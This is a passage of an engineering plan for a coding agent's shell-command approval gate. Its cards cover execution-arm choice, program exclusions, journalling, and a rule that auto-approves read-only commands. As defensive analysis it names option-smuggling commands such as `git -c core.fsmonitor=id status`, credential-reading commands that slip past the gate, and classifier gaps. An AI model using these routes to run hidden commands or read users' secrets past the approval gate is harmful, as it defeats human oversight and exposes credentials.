  `stdin_safe`), the grounding is wrong and the card's premise collapses — stop.

### T2 — Stop promising a shell the term arm never starts [wave 2] [risk: low]

**Depends on:** none (waved after T3 only to avoid editing `bash.rb` concurrently)
**Files:** modify `lib/lain/tools/bash.rb` (`#description` at :119-123, `field :command` at :64),
`lib/lain/tools/core_exec.rb` (`#description` at :63-67); modify
`spec/lain/tools/bash_spec.rb`, `spec/lain/tools/core_exec_spec.rb`
**Reuse:** `lib/lain/tools/grep.rb:17-21,57,195-205` — the shipped precedent for a description
that constrains what the model should send, and whose class comment states the same two-arm
parity argument ("`{#description}` therefore promises the SUBSET both paths accept").
**Shared-file wiring:** none
**Reachable from:** `Tool#to_schema` (`tool.rb:148-155`) puts `description` on the wire for every
request; `field :command`'s description reaches both arms through the shared `Bash::Input`
(`core_exec.rb:40`). The `bash` half is live for any session holding it.

**The `core_exec` half is deliberately held to a weaker standard than the cut CoreExec card was,
and the plan should say so rather than apply its own rule unevenly.** Nothing in `lib/` constructs
`Tools::CoreExec` (only `spec/support/tool_registry.rb:57`) and `--exec` cannot resolve it
(`exec_backend.rb:42-48`, `BACKENDS = %w[local docker]`). A card *building a capability* there
would be shipping something dormant, which is why that card was cut. Keeping the description in
step is different in kind: it completes a contract the shared `Input` already enforces on one
half, and letting the two `#description` strings drift would guarantee a defect the day someone
does construct it. Cheap, and it prevents rather than builds.

Both tools tell the model they run the command "via `sh -c`". That is false whenever
`Shell::Verdict` allows — that path runs reconstructed argv through `Open3.pipeline_r` with no
shell process at all — and it is the only untrue thing either description says.

Say what is true, and add what the model has no way to know: which shapes take the shell-free
path. Measured, that is a command whose every stage is a literal program with literal words,
optionally joined by pipes. What loses it: quoting or escaping of any kind, `;`, `&&`, `||`, `&`,
redirection, variable expansion, globs, and any program that can run a program named in its own
arguments (`git`, `tar`, `rsync`, interpreters, `sudo`, `less`).

`field :command`'s description is shared by identity between the two tools, so guidance written
there lands on both and cannot drift. The two `#description` strings are separate and must be
edited together or they diverge — that is the only placement subtlety, and it is a real one.

**There is no truncation constraint.** An earlier draft of this plan asserted that
`one_line_description` would hide anything past the first sentence; it splits on newlines, and no
description contains one. Do not contort the first sentence for a limit that does not exist.

Frame it as a capability, not a mandate — simple commands and pipes avoid a shell, anything else
gets one. Do not name a dialect and do not mention YSH or oil: the research behind this plan
found adherence to a stated syntax constraint tops out near two-thirds and fails silently into
bash, so the guidance has to stay true and useful when ignored.

**Acceptance criteria:**

```gherkin
Scenario: neither arm claims a shell it may not use
  Given the bash tool and the core_exec tool
  When their descriptions are read
  Then neither states unconditionally that the command runs via sh -c
  And each says a shell is used only when the command is not fully understood

Scenario: both arms describe the command field identically
  Given Bash::Input and the input model of core_exec
  When the command field's description is read from each
  Then they are the same string, because the two tools share one Input class

Scenario: the described shape is the shape the verdict allows
  Given the guidance in the description
  When Shell::Verdict judges "cat README.md | head -20"
  Then the decision allows and carries [["cat","README.md"],["head","-20"]]
  And "echo a && echo b", which the description warns against, abstains
```
→ spec files: `spec/lain/tools/bash_spec.rb`, `spec/lain/tools/core_exec_spec.rb`

**Escalation triggers:**
- If a spec anywhere beyond those two files asserts the literal string "via `sh -c`" — grep
  `spec/` before editing — the blast radius is wider than this card and the orchestrator decides.
- If any prompt-cache or schema-digest fixture pins the tool schema bytes, changing a description
  invalidates it. `Canonical` serializes tool schemas for cache stability; report the break
  rather than regenerating a fixture silently.
- If the honest description cannot be written without becoming vague, stop and report. A
  reassuring first line is worse than the current honest-but-wrong one.

### T3 — Every backend says whether it can take a term, and the chooser asks before it offers [wave 1] [risk: medium]

**Depends on:** none
**Files:** modify `lib/lain/exec.rb` (contract comment at :22-36), `lib/lain/exec/local.rb`,
`lib/lain/exec/core.rb`, `lib/lain/exec/docker.rb`, `lib/lain/tools/bash.rb` (`#perform` at
:139-147); modify `spec/lain/exec/local_spec.rb`, `spec/lain/exec/core_spec.rb`,
`spec/lain/exec/docker_spec.rb`, `spec/lain/tools/bash_spec.rb`
**Reuse:** the existing refusals — `core.rb:75-79` (`#accepts!`) and `docker.rb:158-161`
(`#one_stage`) — which already encode each backend's true answer. `core_exec.rb:37-40`'s idiom
("one class is what makes schema drift between the two arms structurally impossible") is the
model for how predicate and refusal should relate.
**Shared-file wiring:** none. `lib/lain/exec.rb` is not orchestrator-owned and no other card
touches it; do not touch its `require` lines.
**Reachable from:** `Wiring::ToolsetBuild` → `BaseTools.build(recorder, exec:)`
(`toolset_build.rb:234`) constructs `Tools::Bash` with the backend `CLI::ExecBackend.resolve`
picked from `--exec` (`exec_backend.rb:48-56`). `#perform` runs on every bash call, so this card
changes live behaviour for `--exec docker`.

`exec.rb:22-36` names this gap and calls the status quo an accident:

> ⚠️ THIS IS NOT A CALLER'S BUG. {Tools::Bash} offers whichever shape {Shell::Verdict} returns …
> so under `--exec docker` an ordinary command reaches a backend with no shape for it through
> nobody's mistake. What catches it is a blanket `rescue StandardError` in Effect::Handler::Live,
> not a design. The missing piece is a MESSAGE — a `#takes_term?` predicate the arm-chooser could
> ask — and it touches {Local}, {Core} and {Tools::Bash} together.

The comment says "together", and this card takes it at its word. An earlier draft split the
predicate from its only consumer into two waves; the predicate's every acceptance criterion is
only interesting as an input to an arm choice, so the halves are not honestly testable apart.

The predicate takes the term, not nothing: the three answers differ by shape, not merely by
backend. `Local` takes any term; `Docker` takes a one-stage term and refuses a piped one; `Core`
takes none. A per-backend predicate could not express Docker at all.

**Derive the refusal from the predicate rather than testing that they agree.** Two
implementations of `term.size == 1` that a spec checks for consistency is a spec standing where a
construction belongs — `raise Unsupported unless takes_term?(command)` makes disagreement
unrepresentable. There is no base class (`exec.rb:13-19` is the whole contract, three duck-typed
classes); keep it that way and let each backend answer for itself.

Then, in the tool: ask before offering. When the backend cannot take the term, fall back to
`input.command` — the string the model actually wrote, which the shell was always going to see on
that path. **Never join the term back into a string**; `docker.rb:154-156` refuses to and gives
the reason. The user-visible win is that `--exec docker` stops erroring on ordinary pipelines.

`requires_approval?` stays `true` (`bash.rb:135`). This card changes which arm runs, never who is
asked.

**Acceptance criteria:**

```gherkin
Scenario: each backend answers for the shapes it really runs
  Given Exec::Local
  Then it takes a one-stage term and a piped term
  Given Exec::Docker
  Then it takes a one-stage term and does not take a two-stage term
  Given Exec::Core
  Then it does not take a one-stage term

Scenario: the refusal cannot disagree with the predicate
  Given any backend and any term it says it cannot take
  When that term is passed to #call
  Then Exec::Unsupported is raised
  And for every term it says it can take, #call does not raise Unsupported

Scenario: a backend that takes the term gets the term
  Given a backend that takes any term
  When the model runs "cat README.md | head -20"
  Then the backend receives the term, not the string

Scenario: a backend that cannot take the term gets the model's own string
  Given a backend that takes only a one-stage term
  When the model runs "grep -r foo . | wc -l"
  Then what reaches the backend is byte-identical to what the model wrote
  And no Unsupported error reaches the model

Scenario: an abstention always runs as the string
  Given any backend
  When the model runs "echo a && echo b"
  Then the backend receives the original command string

Scenario: the docker backend a real session resolves runs an ordinary pipeline
  Given a toolset built the way --exec docker builds one, with a real Exec::Docker
  When the model runs "grep -r foo . | wc -l"
  Then the call does not return a tool error about an unsupported shape
```
→ spec files: `spec/lain/exec/local_spec.rb`, `spec/lain/exec/core_spec.rb`,
`spec/lain/exec/docker_spec.rb`, `spec/lain/tools/bash_spec.rb`

**Escalation triggers:**
- `spec/lain/exec/docker_spec.rb:559-565` asserts that an allowed pipeline reaching Docker raises
  `Unsupported`. This card makes that unreachable *from the tool* while the backend's own refusal
  stays. If that example breaks rather than continuing to pass as a direct backend test, the card
  has changed the backend instead of the chooser — stop.
- `Exec::Docker#call` wraps its own built docker argv in `[…]` and hands it to an injected `Local`
  (`docker.rb:112-116`). If the predicate ends up answering about that *inner* argv rather than
  the caller's term, stop — this is the subtle wrong turn available here.
- If falling back to the string arm changes output bytes for a command that previously ran as a
  term on `Local`, stop. `chunk-modes-approval-undo.md` T17 recorded that the two arms must
  produce the same output for the same accepted command; a divergence is a finding about that
  invariant, not something to paper over.
- If a fourth exec backend exists that grounding missed (grep `lib/lain/exec/` for classes
  answering `#call(command:`), it needs the predicate too — report before proceeding.

### T4 — An excluded-programs table in the project config [wave 1] [risk: medium]

**Depends on:** none
**Files:** create `lib/lain/shell/exclusions.rb`, `spec/lain/shell/exclusions_spec.rb`;
modify `lib/lain/config.rb`, `spec/lain/config_spec.rb`
**Reuse:** `lib/lain/sensitivity.rb:173-201` (`Sensitivity::Rules`) — a keyed table whose
per-key verdicts carry their own reason "so a human reading a refusal can tell our table from
theirs", raising a `Refusal` that names the path. `Config.sensitivity` (`config.rb:115-120`) is
the precedent for a reader kept out of `.load` deliberately, because the two have opposite
postures about a typo.
**Shared-file wiring:** `require_relative "shell/exclusions"` in `lib/lain/shell.rb`
(orchestrator-owned; hand it back as a one-line diff)
**Reachable from:** deferred within this card by design — **T6** builds the set from config and
hands it to the one `Shell::Verdict` both seams share. Split from T6 because the config object
has its own refusal vocabulary and its own specs, while T6's work is threading one object
through three wiring files.

`Shell::Verdict` has a deny path production can never reach: `excluded_programs`
(`verdict.rb:213-217`) consults `@capability_set`, which defaults to `AnyProgram` —
`permits?(_program) = true` (`verdict.rb:174-176`) — and nothing in `lib/` passes another. The
seam is real, specced, and inert. This card gives a project a way to fill it.

The interface is `permits?(program)`; that is all `Verdict` uses, and `verdict.rb:179-180` says
the basename is what it is asked about. Read from `.lain/config.toml` with `Sensitivity::Rules`'
posture: absent table means empty set, malformed table is a loud refusal naming the file.

**A wildcard is legal here, and must be honoured.** `Sensitivity::Rules.unbounded?`
(`sensitivity.rb:297-301`) refuses `*` only under `exempt`, "the one key that SUBTRACTS", and
says in as many words that the same patterns under `denied` or `gated` "can only ever add, so
they stay legal". An exclusion table only restricts, so `exclude = ["*"]` is the strictest
posture expressible and it fails closed. An earlier draft of this plan had this backwards.

Default empty, so nothing existing changes. Whether to ship a non-empty default is an Open
decision, not this card's to settle.

Note the coverage limit: `deny` fires only when the parse is `covered?` (`verdict.rb:214`), so an
excluded program inside a command the parser could not fully read still abstains. That is
correct — `verdict.rb:210-212` says an abstention "is not weaker … an abstention still goes to a
human" — and this card must not try to widen it.

**Acceptance criteria:**

```gherkin
Scenario: no config means nothing is excluded
  Given a project with no .lain/config.toml
  Then the exclusion set permits every program

Scenario: a named program is excluded, by basename
  Given a config excluding "curl"
  Then the set does not permit "curl"
  And it permits "cat"

Scenario: a wildcard exclusion is honoured, not refused
  Given a config whose exclusion entry is "*"
  Then the set permits no program at all

Scenario: a malformed table refuses loudly and names the file
  Given a .lain/config.toml whose exclusion table is a string rather than a table
  When the exclusion set is built
  Then it raises, and the message names the config path

Scenario: an unknown key inside the table is loud
  Given an exclusion table carrying a key this class does not read
  When the exclusion set is built
  Then it raises rather than silently ignoring it
```
→ spec files: `spec/lain/shell/exclusions_spec.rb`, `spec/lain/config_spec.rb`

**Escalation triggers:**
- If `[approval]` looks like the natural home, stop and confirm: grounding found it is
  `Config::Answers` (remembered answers), and overloading one table with two vocabularies is the
  wrong shape. A new table is this plan's assumption; contradicting evidence is worth surfacing.
- `Config.load` and `Config.sensitivity` have deliberately opposite postures about an unknown key
  (`config.rb:17-30`). If this table cannot be read without forcing one posture on the other,
  stop rather than changing `.load`'s tolerance.
- If a spec asserts `Config` understands exactly three tables, this card widens that — report it.

### T5 — A journal record for the arm a command ran on [wave 1] [risk: low]

**Depends on:** none
**Files:** create `lib/lain/telemetry/shell_arm.rb`, `spec/lain/telemetry/shell_arm_spec.rb`
**Reuse:** the 22 record types in `lib/lain/telemetry/`; `seam_decision.rb` and
`secret_boundary.rb` are closest in shape (a decision, its reason, what it was about).
`Lain::Declarative::Carrier` as those use it. `compaction/derivation_audit/edge.rb:76-79` for why
a String read off the Journal is interned on the way in.
**Shared-file wiring:** `require_relative "telemetry/shell_arm"` in `lib/lain/telemetry.rb`
(orchestrator-owned; hand it back)
**Reachable from:** deferred within this card by design — **T7** constructs it from
`Tools::Bash` on the production path. Split because the record is a value object with its own
frozen-ness specs, and the tool-side wiring needs T6's shared verdict to be correct.

The Journal is the experiment record and cannot currently answer "which arm ran?". The gate
journals a `shell verdict` inside its escalation record (`escalation.rb:535-538`), but only when
the gate runs — and `/mode auto` replaces the whole ladder (`gate.rb:32-34`,
`mode/resolution.rb:107`), so an unattended run records nothing about arm selection at all. That
is the mode a long run uses, which is what makes it the mode the record most needs to cover.

Carry the verdict name, the reason, the term when there is one, and what ties the record to its
call. `Shell::Verdict::CLAIM` rides on every escalation record so a reader cannot mistake a
verdict for a safety claim (`escalation.rb:535-538`); this record is read by the same people and
needs the same protection.

Deeply frozen, `Ractor.shareable?` true — the project's mechanical statement of no reachable
mutable state, and there is a spec for it.

**Acceptance criteria:**

```gherkin
Scenario: the record names the arm and survives a round trip
  Given a shell arm record for an allowed term
  When it is written to the journal and read back
  Then it names the allow verdict and carries the term as written

Scenario: an abstention has no term
  Given a shell arm record for an abstention
  Then its term is empty, and reading it needs no nil guard

Scenario: the record is shareable
  Given any shell arm record
  Then Ractor.shareable? holds for it

Scenario: the record cannot be mistaken for a safety claim
  Given any shell arm record
  Then it carries the same claim disclaimer every shell verdict record carries
```
→ spec file: `spec/lain/telemetry/shell_arm_spec.rb`

**Escalation triggers:**
- If an existing record already carries arm information (grep `lib/lain/telemetry/` for `verdict`
  and `term`), do not add a second — report and let the orchestrator decide whether to extend it.
- If `spec/lain/telemetry/` has a shared shape or shareability example group every record joins,
  and this record cannot join it, stop and say why.

### T6 — One verdict, built from config, injected at both seams [wave 2] [risk: high]

**Depends on:** T4
**Files:** modify `lib/lain/cli/wiring.rb`, `lib/lain/cli/wiring/toolset_build.rb`,
`lib/lain/cli/wiring/board_build.rb`, `lib/lain/cli/wiring/base_tools.rb`,
**`lib/lain/cli/switchboard.rb`**; create `spec/lain/cli/wiring/base_tools_spec.rb`; modify
`spec/lain/cli/wiring/toolset_build_spec.rb`, `spec/lain/cli/wiring/board_build_spec.rb`,
`spec/lain/cli/switchboard_spec.rb`
**Reuse:** `Shell::Exclusions` from T4. **Both injection points already exist and neither needs
changing**: `Triage#initialize(verdict: Shell::Verdict.new, …)` (`escalation.rb:480`) and
`Tools::Bash#initialize(exec:, verdict: Shell::Verdict.new)` (`bash.rb:111`).
`board_build.rb:47-54` already reads `Config.sensitivity` with a project root and is the model
for where a config-derived collaborator is built.
**Shared-file wiring:** none. This card owns all four wiring files; T7 and T9 each add one line
to one of them in a later wave.
**Reachable from:** `Wiring#toolset` → `ToolsetBuild` → `BaseTools.build` → `Tools::Bash.new`
(`toolset_build.rb:234`), and `Wiring#switchboard` → `BoardBuild.for` → `Switchboard.for` →
`#build_ladder` → `Triage.new` (`wiring.rb:355`, `switchboard.rb:267`). This card is what makes
the deny path reachable in production for the first time.

**The spine of the chunk.** Build one `Shell::Verdict`, from the project's exclusion table, and
give it to both objects that construct one today.

Three properties fall out of one change, and each is why an earlier draft needed a separate card:

- **The config deny path becomes reachable.** An exclusion is "a decision, not a doubt", which is
  why `judge` consults it before the abstention ladder (`verdict.rb:191-196`) — the observable win
  is a named refusal where there was a prompt.
- **The double parse stops mattering.** `Verdict` is frozen and pure (`verdict.rb:181-189`), so
  two sites holding *the same instance* compute the identical `Decision` from the identical
  String. "The journalled verdict is the verdict the tool acted on" becomes true by construction
  rather than by a spec, and nothing has to be carried between the gate and the tool — so nothing
  can be forged in transit.
- **Downstream cards get an authoritative term** without a new trust edge, which is what T8 and
  T9 build on.

**`Triage` is built two hops past `BoardBuild`, and that is the fifth file.** The board arm is
`Wiring#switchboard` (`wiring.rb:354-356`) → `BoardBuild.for` (`board_build.rb:45-55`) →
`Switchboard.for` (`switchboard.rb:90-94`) → `#initialize` (`switchboard.rb:133-150`) → `seed` →
**`#build_ladder` (`switchboard.rb:265-270`)**, which is where `Triage.new` actually happens.
Neither `Switchboard.for` nor `#initialize` has a `verdict:` slot today, so both gain one. An
earlier draft of this card stopped at `board_build.rb` and could not have turned either of its
headline ACs green.

**The threading is the work, and it is genuinely awkward.** `wiring.rb:302` builds the toolset;
`wiring.rb:355` builds the switchboard *from* the finished toolset. So the shared verdict must be
built at or above `wiring.rb` and passed down into both `ToolsetBuild` and `BoardBuild`.
`BaseTools.build`'s signature widens, and grounding counted roughly seven call sites across
`lib/` and `spec/` — expect that, and note `lib/lain/cli/wiring/base_tools.rb` has **no mirrored
spec today**, so this card creates one.

**Do not make the tool depend on the gate.** `Tools::Bash` must stay correct constructed alone,
with the default verdict — `bash_spec.rb` exercises it that way and `Tools::Subagent` runs an
ungated handler (`subagent.rb:313`). Sharing an instance is an injection, not a dependency.

**Say what `/mode auto` does to this.** Under `auto` the Gate's policy is `ApproveAll`
(`mode/resolution.rb:107`, `gate.rb:32-34`) and the ladder is never consulted, so the exclusion
table denies nothing there. The tool still holds the same verdict and still chooses its arm. That
asymmetry is a fact about `auto`, not a defect in this card, and it belongs in the code's comments
where the next reader will look for it.

**Acceptance criteria:**

```gherkin
Scenario: an excluded program is denied rather than prompted
  Given a project whose config excludes "curl"
  And an attended session built the way a live session builds one
  When the model runs "curl http://example.com"
  Then the ladder denies it at the triage rung, naming curl and the session's exclusion
  And no approval is parked for a human

Scenario: the gate and the tool hold the same verdict object
  Given a session built the way a live session builds one
  Then the verdict the triage rung consults and the verdict the bash tool consults are the
    same instance

Scenario: no config leaves every existing behaviour unchanged
  Given a project with no exclusion table
  When the model runs any command
  Then the outcome is what it was before this card

Scenario: exclusion does not fire on a command the parser could not read
  Given a project whose config excludes "sh"
  When the model runs a command the parser does not fully cover that mentions sh
  Then it abstains to a human rather than denying

Scenario: the bash tool built alone still works
  Given Tools::Bash constructed with no verdict argument
  When the model runs "ls -la"
  Then it runs the term arm
```
→ spec files: `spec/lain/cli/wiring/base_tools_spec.rb`,
`spec/lain/cli/wiring/toolset_build_spec.rb`, `spec/lain/cli/wiring/board_build_spec.rb`

**Escalation triggers:**
- If threading the verdict from `wiring.rb` into both branches requires a *fourth* object to hold
  it, or requires the switchboard to reach back into the toolset, **stop**. The seam is either at
  `wiring.rb` or the plan is wrong about the topology.
- `escalation.rb:454-458` records that `verdict:` defaults at call time rather than in a constant
  because `lain.rb` loads `lain/approval` before `lain/shell`. If injection forces a load-order
  change, stop — a `NameError` at require time is that constraint biting.
- If widening `BaseTools.build` touches more than the roughly seven call sites grounding counted,
  report the real number before continuing; that is the card's cost and it was estimated.
- If any existing spec's expectations change because a fixture config leaks an exclusion into
  unrelated tests, report it rather than adjusting the fixture.

### T7 — The bash tool journals the arm it ran [wave 3] [risk: medium]

**Depends on:** T5, T6
**Files:** modify `lib/lain/tools/bash.rb`, `lib/lain/cli/wiring/base_tools.rb`; modify
`spec/lain/tools/bash_spec.rb`, `spec/lain/cli/wiring/base_tools_spec.rb`
**Reuse:** `Telemetry::ShellArm` from T5. The injected-journal idiom of the eight tools that
already journal — `Tools::Subagent` is the fullest. A Null journal default so a tool built
without one writes nowhere and no caller guards on nil.
**Shared-file wiring:** none (T6 already owns `base_tools.rb` and has merged by this wave)
**Reachable from:** `Wiring::ToolsetBuild` → `BaseTools.build` (`toolset_build.rb:234`)
constructs `Tools::Bash` for every session; this card adds the journal there. **The AC that
matters most drives that real construction, not an injected double** — a `journal:` kwarg with a
Null default is exactly how a plan's wiring silently does nothing.

With T6 the tool holds the same verdict the gate holds, so the record it writes is the decision
the system acted on — correct by construction rather than by two objects agreeing. And it covers
`/mode auto`, where the ladder never runs and nothing is recorded today.

Record on **every** bash call, both arms. An abstention that ran through `sh -c` is as much a
datapoint as an allow that ran as argv; a record written only on the interesting branch cannot
answer "what fraction of commands earn the deterministic arm", which is the measurement T2's
guidance exists to move and T10 reads back.

Exit status, stdout and stderr stay out — `bash.rb:137-139` is explicit that a nonzero exit rides
in the content and `is_error` means the tool itself could not produce a result. This record is
about the decision, not the outcome.

**Acceptance criteria:**

```gherkin
Scenario: an allowed command records the term arm
  Given a session
  When the model runs "cat README.md | head -20"
  Then a shell arm record is journalled naming the allow verdict and carrying the term

Scenario: an abstaining command records the shell arm
  Given a session
  When the model runs "echo a && echo b"
  Then a shell arm record is journalled naming the abstention

Scenario: auto mode records too
  Given a session in auto mode, where no escalation record is written at all
  When the model runs "ls -la"
  Then a shell arm record is still journalled

Scenario: the real session wiring passes a journal
  Given a toolset built the way a live session builds one
  When the model runs any command
  Then the record lands in that session's journal, with no double injected by the test

Scenario: a tool built without a journal writes nowhere and does not fail
  Given the bash tool constructed with no journal
  When the model runs "ls -la"
  Then the command runs and nothing is written
```
→ spec files: `spec/lain/tools/bash_spec.rb`, `spec/lain/cli/wiring/base_tools_spec.rb`

**Escalation triggers:**
- If `BaseTools.build` has no journal available at the point it constructs `Tools::Bash`,
  stop — threading one from further out is a wiring change with its own blast radius, and T6 has
  already widened that signature once.
- Output discipline: nothing outside `lib/lain/frontend/` may touch `$stdout`/`$stderr` and
  `spec/output_discipline_spec.rb` enforces it. A record written to the wrong sink shows up
  there; that is the finding, not a spec to skip.
- If journalling on every call measurably slows the suite or a session, report the number.

### T8 — A rule's Call carries a term it cannot be given [wave 4] [risk: high]

**Depends on:** T6, T7
**Files:** modify `lib/lain/approval/rule.rb` (`Call` at :101-125, the guard at :144-149),
`lib/lain/approval/escalation.rb` (the `Rules` rung's `Call.for`); create
`spec/lain/approval/rule_spec.rb`; modify `spec/lain/approval/escalation_spec.rb`
**Reuse:** `Approval::Rule::Call` (`rule.rb:101`) and `Call.for` (`rule.rb:121`) — the door being
widened. **`Approval::Risk::Keepsake` (`risk.rb:71-103`) is the shipped answer to "a value that is
proof, not a claim"**: `private_class_method :new, :[], :for, :scalar` plus
`def with(**) = raise Forged`, with a comment saying `#with` "is the sharper door because it
starts from a LEGITIMATE keepsake". Follow it rather than inventing a second shape. Note
`risk.rb:60-67` is a **second** class comment naming this card's work as the fix ("the real answer
is the ladder building a bash `Rule::Call` from a PARSED term … until then this is a hole with a
name"). The shared verdict from T6, so the term is derived rather than transported.
`Approval::Remembered` (`remembered.rb:95-97`), which builds its key from `call.tool_name` and
`call.input.attributes` and **must keep working byte-identically**.
**Shared-file wiring:** none
**Reachable from:** `Escalation::Rules#call` builds a `Call` for every gated effect
(`escalation.rb:311-328`) and hands it to the rule chain; the ladder is built at
`switchboard.rb:267`. This card changes what rules can see on that live path. It builds **no
rule** — T9 does — so on its own it changes no decision.

`Approval::Rule`'s class comment names this as the work:

> The DOCTRINE is that a shell command reaches policy as a parsed term … or not at all — but the
> escalation ladder does not enforce it: its `rules` rung still calls `Call.for(tool:, input:
> effect.input)` with the model's raw input. … A hand-written prefix rule —
> `command.start_with?("git ")` — would therefore allow `git -c core.fsmonitor=id status`, which
> executes `id`.

**Ask the tool for its verdict; do not thread one.** `Rules#subject` builds the call as
`Rule::Call.for(tool: @tools.fetch(effect.name), input: effect.input)` (`escalation.rb:325`), and
`escalation.rb:293-295` says `@tools` is "the LIVE capability set … the exact tool the executor
would dispatch". That tool is the `Tools::Bash` T6 already handed the session's one verdict. So
`Call.for` asks it, and nothing needs threading through `Switchboard`/`BoardBuild` — which also
sidesteps `escalation.rb:454-461`'s load-order constraint, since no `Shell::Verdict` constant is
named in the `approval` namespace. `Tools::Bash` exposes `@verdict` through no message today
(`bash.rb:110-115`), so this card adds one — which is why it waits for T7 rather than sharing
`bash.rb` with it in one wave.

**The term is a derived READER, not a `Data` member.** Measured: a member derived inside
`initialize` does **not** raise on `#with` — it silently *corrects* the forged value, so an AC
expecting a raise cannot pass. A derived reader raises `ArgumentError: unknown keyword: :term`,
which is the honest behaviour and leaves `Ractor.shareable?` and `Remembered::Entry.for_call`
(`remembered.rb:95-97`, reading `call.tool_name` and `call.input.attributes`) untouched by
construction.

**The term must be derived, never accepted as a parameter.** `Call`'s constructor is locked by `rule.rb:144-149` — it raises unless `input` is a
`Tool::Input`, and the class comment (`rule.rb:24-27`) says that one line shuts `new`, `Data::[]`
**and** `#with`. Adding a third member silently breaks that: `call.with(term: [["cat",
"/home/u/.ssh/id_rsa"]])` re-runs `initialize`, `input` is still a valid `Tool::Input`, the check
passes, and a **forged term** reaches a rule that approves on it. Deriving the term from
`input.command` at construction closes the hole by making the member not independently settable;
the invariant to hold is that a `Call`'s term always corresponds to its own input.

Absence must read as absence. `NO_TERM` is already a frozen empty Array Null Object
(`verdict.rb:158`), and most commands abstain — what a rule must never be able to do is silently
fall back to prefix-matching the string when the term is empty.

This card widens a security-relevant interface and builds nothing that uses it, deliberately: the
door and the policy that walks through it are separate reviews.

**Acceptance criteria:**

```gherkin
Scenario: a command tool's call carries the parsed term
  Given a gated call to bash that the verdict allows
  When the rules rung builds its Call
  Then the Call carries [["cat","README.md"],["head","-20"]]

Scenario: a Call cannot be given a term at all
  Given a Call for the command "ls -la"
  When something attempts to copy it with a different term via #with
  Then it raises, because term is a derived reader and not a member to be set
  And the term it reports still corresponds to its own input

Scenario: an abstention carries no term, visibly
  Given a gated call to bash that the verdict abstains on
  Then the Call's term is empty
  And a rule can tell "no term" from "a term with no stages"

Scenario: a non-command tool is unaffected
  Given a gated call to a tool whose input is not a command
  Then the Call is what it was before this card

Scenario: the remembered rule is unchanged
  Given a remembered approval for a specific bash call
  When the same call is made again
  Then it is allowed exactly as before, and a call differing in its arguments is not
```
→ spec files: `spec/lain/approval/rule_spec.rb` (**create** — `Rule` has no mirrored spec today;
it is exercised through `rule_chain_spec.rb`, `remembered_spec.rb` and `risk_spec.rb`),
`spec/lain/approval/escalation_spec.rb`

**Escalation triggers:**
- If after this card `Call.with` can produce an instance whose term does not match its input,
  **stop** — that is the whole point of the card and a passing suite would be lying.
- If `Approval::Remembered`'s key changes shape at all, stop. A changed key silently invalidates
  every remembered answer a user has.
- If deriving the term requires the rules rung to construct its own `Shell::Verdict`, T6's
  injection has not reached this rung — report rather than adding a parse.
- If any existing rule in `lib/` or a fixture prefix-matches a command string, this card makes
  that hazard concrete. Report it; do not fix it here.

### T9 — A rule that approves a term whose every stage and every word is safe [wave 5] [risk: high]

**Depends on:** T6, T8
**Files:** create `lib/lain/approval/composed_term.rb`,
`spec/lain/approval/composed_term_spec.rb`; modify `lib/lain/cli/wiring/board_build.rb`,
`spec/lain/cli/wiring/board_build_spec.rb`
**Reuse:** `Approval::Rule` and its `Decision` carrying the deciding rule's name
(`rule.rb:56-60`). The term-carrying `Call` from T8. The `Sensitivity` classifier a session
already builds, reached the way `Triage::Command#refused` reaches it (`escalation.rb:521-529`).
**Shared-file wiring:** `require_relative "approval/composed_term"` in `lib/lain/approval.rb`
(orchestrator-owned; hand it back). The rule is appended to the chain `BoardBuild` passes as
`rules:` — note `switchboard.rb:90-94` receives that chain from `Project::Consent`
(`board_build.rb:52`), so this card **appends to** an existing chain and does not own it.
**Reachable from:** `Wiring#switchboard` → `BoardBuild.for` → `Switchboard.for(rules:)` →
`#build_ladder` → `Escalation.for` → `[Triage, Rules, Surfaces]` (`escalation.rb:145-146`), and
the first non-abstaining rung wins via the lazy `filter_map … first` at `escalation.rb:189-192`.
The AC below drives a real session through the ladder, not the rule directly.

This is the card the chunk exists for, and the only one that can approve something.

**The rule** approves a `bash` call only when **every one** of these holds. Anything else
abstains and falls through to the rest of the ladder exactly as today.

1. The decision **allows** (which already subsumes "the session does not exclude any program" —
   an exclusion makes `Verdict#judge` return `deny`, `verdict.rb:198-205`, so `allow?` is false).
2. Every stage's argv0 is a **bare name** — any `/` disqualifies.
3. Every program is on **this rule's allowlist**.
4. Every word of every stage classifies **`ordinary`** — not merely "not denied".
5. No stage carries a flag that **widens its read set past its literal arguments**.

**Predicate 4 is a blocker fix and the word matters.** `Sensitivity` is three-valued, and the
gated tier is where this codebase put the credential files it declined to hard-refuse —
`sensitivity.rb:346-353` lists `.env`, `.env.*`, `.envrc`, `*.pem`, `*.p12`, `credentials.json`,
`secrets.y*ml`, `.git-credentials`, `.npmrc`, `.pypirc`, `terraform.tfstate`, `*.tfvars`, plus
`~/Downloads`, `~/Documents`, `~/Desktop`. Its header states the justification outright: *"A
spurious match here costs one prompt, so these are the half that widens."* Measured — `cat .env`,
`cat ~/.git-credentials`, `cat config/credentials.json`, `cat server.pem`,
`cat terraform.tfstate` **all classify `gated`, and all reach `allow`**. A "not denied" predicate
approves every one. `escalation.rb:385-387` says why gated was allowed to stay an abstention:
*"an abstention already reaches a human"* — the same premise `PATHLIKE` rests on, and the same one
this rule destroys. Requiring `ordinary` also catches
`MALFORMED = Verdict.new(level: :gated, …)` (`sensitivity.rb:364`) for free, so a word the
classifier could not read cannot pass as "not denied".

**Predicate 5 exists because the check is over the term and the hazard is over the read set.**
Measured: `grep -h -r . ~/.ssh` reaches `allow` with **every word classifying `ordinary`** —
including `~/.ssh` itself, because the rule is `Rule.within(".ssh", name: "id_*")`
(`sensitivity.rb:329`) and the *directory* is not a match. Predicate 4 does not save this. The
command prints `id_rsa`, which `escalation.rb:416` says "NOTHING lifts — not a policy, not
`/mode auto`, not `ApproveAll`, and not `[sensitivity] exempt`". So **each allowlist entry carries
the flags that disqualify it**, and a stage naming one is refused.

This is deliberately *not* the general flag-aware policy the plan defers for `git`. That is an
open-ended question about a program that can execute what its options name. This is a bounded
list of disqualifying flags on a handful of read-only tools, and it is the same discipline
`pipeline.rb:95-104` already states after `rg --pre=id` was measured executing `id`: membership
requires having read the program's flags. **Consequence, and it must be stated in the Intent:**
`grep -rn foo lib | wc -l` no longer qualifies. `grep -n foo lib | wc -l` does.

#### The two things that make this dangerous, both measured

**Triage's deny is narrower than its classification, and this rule must not inherit that gap.**
`Triage::Command#literal` partitions denied words on `PATHLIKE = %r{/|\A~}`
(`escalation.rb:437,512-518`); a denied word with neither a separator nor a leading tilde is
downgraded from deny to **abstain**. Measured against the real rung with `.netrc` denied:

```
cat .netrc      => abstain      cat ./.netrc  => deny
